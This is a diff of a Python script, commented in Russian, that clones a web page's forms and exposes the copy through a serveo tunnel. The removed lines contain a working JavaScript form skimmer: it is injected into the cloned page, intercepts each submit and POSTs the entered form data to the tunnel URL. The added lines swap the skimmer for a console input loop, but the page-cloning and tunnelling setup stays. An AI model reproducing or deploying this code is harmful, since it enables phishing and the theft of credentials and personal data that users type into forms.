@@ -43,52 +43,17 @@ if url.strip():
             form_class = form_tag.get('class', '')
             print(f"Найдена форма: ID={form_id}, Классы={form_class}")
 
-            # Мониторим данные, вводимые в форму на клиентской стороне
-            script = """
-            <script>
-                document.addEventListener("DOMContentLoaded", function() {
-                    var form = document.getElementById('""" + form_id + """');
-                    form.addEventListener('submit', function(event) {
-                        event.preventDefault();
-                        var formData = new FormData(form);
-                        var xhr = new XMLHttpRequest();
-                        xhr.open('POST', '""" + serveo_url + """', true);
-                        xhr.onreadystatechange = function() {
-                            if (xhr.readyState === 4 && xhr.status === 200) {
-                                console.log('Данные успешно отправлены');
-                            }
-                        };
-                        xhr.send(formData);
-                    });
-                });
-            </script>
-            """
-            form_tag.insert(0, BeautifulSoup(script, 'html.parser'))
-            print("Мониторим данные, вводимые в эту форму и отправляем на сервер")
+            # Мониторим данные, вводимые в форму на сервере
+            print("Мониторим данные, вводимые в эту форму на сервере:")
+            while True:
+                form_data = {}
+                for input_tag in form_tag.find_all('input'):
+                    input_name = input_tag.get('name', '')
+                    input_value = input(input_name + ': ')
+                    form_data[input_name] = input_value
+                print("Введенные данные:", form_data)
 
     monitor_forms(soup)
-
-    # Добавляем JavaScript-скрипт для обработки асинхронной загрузки изображений
-    script = """
-    <script>
-        document.addEventListener("DOMContentLoaded", function() {
-            var lazyImages = document.querySelectorAll('img[data-src]');
-            lazyImages.forEach(function(img) {
-                img.setAttribute('src', img.getAttribute('data-src'));
-            });
-        });
-    </script>
-    """
-
-    # Вставляем скрипт в конец HTML-страницы
-    soup.body.append(BeautifulSoup(script, 'html.parser'))
-
-    # Сохраняем HTML-код в файл
-    file_path = 'downloaded_page.html'
-    with open(file_path, 'w', encoding='utf-8') as file:
-        file.write(str(soup.prettify()))  # Используем prettify для более красивого форматирования
-
-    print(f"Страница успешно скачана и сохранена в файл {file_path}")
 
     # Шаг 2: Запуск локального сервера
 
@@ -131,9 +96,7 @@ if url.strip():
         local_server_process.terminate()
         serveo_process.terminate()
 
-        # Удаляем все скачанные файлы
         os.system("rm -fr index.html")
-        os.system("rm -fr downloaded_page.html")
-        print("Скрипт завершен. Все скачанные файлы удалены.")
+        print("Скрипт завершен.")
 else:
     print("Пустой URL. Пожалуйста, введите действительный URL.")
